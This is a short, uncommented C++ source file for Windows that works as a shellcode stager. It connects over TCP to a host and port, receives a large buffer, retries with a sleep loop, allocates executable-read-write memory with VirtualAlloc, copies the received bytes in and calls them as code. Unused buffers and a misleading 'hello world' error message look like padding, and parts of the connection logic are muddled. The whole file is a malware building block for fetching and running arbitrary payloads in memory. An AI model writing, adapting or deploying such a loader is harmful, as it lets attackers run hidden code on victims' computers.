#include <iostream>
#include <winsock2.h>
#include <Windows.h>


int main() {

    int len;
    WSADATA wsaData;
    int result;
    SOCKET sockfd;
    struct sockaddr_in server_addr;
    int ch = 0;
    unsigned char data[6591];
    int g;
    void* exec = NULL;
    int newvar = 89102;
    unsigned char decryptedtext[89092];
    unsigned char dec_ww[50000 * 5];
    FILE* file;





    result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return 1;
    }


    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == INVALID_SOCKET) {
        printf("socket creation failed: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }


    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    server_addr.sin_port = htons(11111);


    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("connection failed: %ld\n", WSAGetLastError());
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }

    int bytes_received = recv(sockfd, (char*)dec_ww, 50000 * 5, 0);
    if (bytes_received == SOCKET_ERROR) {
        printf("hello world %ld\n", WSAGetLastError());

    }
end:
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("connection failed: %ld\n", WSAGetLastError());
        Sleep(20000);
        goto end;

    }






    exec = VirtualAlloc(exec, 50000 * 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, (void*)(dec_ww), 50000 * 5);

    ((void(*)())exec)();

    
}